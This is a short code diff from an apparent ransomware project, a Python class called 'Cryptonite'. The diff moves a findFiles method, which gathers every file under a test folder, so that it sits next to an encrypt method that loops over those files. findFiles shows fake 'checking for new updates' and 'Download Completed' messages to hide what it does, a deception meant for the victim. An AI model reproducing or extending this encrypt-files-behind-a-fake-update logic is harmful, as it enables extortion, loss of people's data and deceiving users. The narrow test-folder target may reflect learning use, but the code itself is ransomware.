@@ -69,6 +69,24 @@ class Cryptonite():
             exit()
 
 
+
+    def findFiles(self):
+        
+        print("Please be patient, checking for new updates...\n")
+        time.sleep(5)
+        print("Update found! Downloading the files... \n")
+        for root, dir, file in os.walk('./testfolder'):
+            for i in range(len(EXCLUDED_DIRS)):
+                if EXCLUDED_DIRS[i] in root:
+                    break
+                else:
+                    if i == len(EXCLUDED_DIRS) - 1:
+                        for files in file:
+                            files = os.path.join(root, files)
+                            fileLists.append(files)
+
+
+
     def encrypt(self):
         
         for file in tqdm.tqdm(fileLists):
@@ -90,20 +108,6 @@ class Cryptonite():
                     pass 
 
 
-    def findFiles(self):
-        
-        print("Please be patient, checking for new updates...\n")
-        time.sleep(5)
-        print("Update found! Downloading the files... \n")
-        for root, dir, file in os.walk('./testfolder'):
-            for i in range(len(EXCLUDED_DIRS)):
-                if EXCLUDED_DIRS[i] in root:
-                    break
-                else:
-                    if i == len(EXCLUDED_DIRS) - 1:
-                        for files in file:
-                            files = os.path.join(root, files)
-                            fileLists.append(files)
                             
         print("Download Completed!\n")
         time.sleep(2)
